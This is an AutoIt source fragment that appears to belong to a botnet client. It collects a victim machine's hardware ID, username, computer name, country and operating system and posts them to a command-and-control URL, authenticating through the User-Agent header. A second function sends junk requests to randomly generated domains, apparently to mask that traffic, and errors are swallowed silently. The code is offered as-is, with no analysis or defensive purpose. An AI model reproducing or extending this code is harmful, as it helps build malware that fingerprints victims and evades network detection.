Func SendAndGet()
   Return SendData(		"id=" & GetHWID() & _
						"&username=" & GetUsername() & "@" & GetPcName() & _
						"&country=" & GetCountry() & _
						"&country_flag=" & GetCountryFlag() & _
						"&version=" & $BOT_VERSION & _
						"&os=" & GetOs())
EndFunc

Func SendData($Data)
   $oHTTP = ObjCreate("WinHTTP.WinHttpRequest.5.1")
   $oHTTP.Open("POST", $HOST_URL, False)
   $oHTTP.SetRequestHeader("User-Agent", $HOST_PASSWORD)
   $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
   $oHTTP.Send($Data)
   
   Return $oHTTP.ResponseText
EndFunc

Global $oError = ObjEvent("AutoIt.Error", "_ErrFunc")
Func _ErrFunc()
    ; Nothing
EndFunc
Func JunkConnection()
   Local $sGETPOST = StringSplit("GET|POST", "|")
   Local $sDomains = StringSplit("com|net|edu|gov|co.uk|it|pt|com.br|es|de|fr", "|")
   $oHTTP = ObjCreate("WinHTTP.WinHttpRequest.5.1")
   
   Local $sURL = "http://" & RandomString() & "." & $sDomains[Random(0, $sDomains[0])] & "/" & RandomString() & ".php"
   $oHTTP.Open($sGETPOST[Random(0, 1)], $sURL, False)
   $oHTTP.SetRequestHeader("User-Agent", RandomString())
   $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
   Local $sData = RandomString() & "=" & RandomString()
   $oHTTP.Send($sData)
   If $oError.Number Then
    $oError.Clear()
EndIf
EndFunc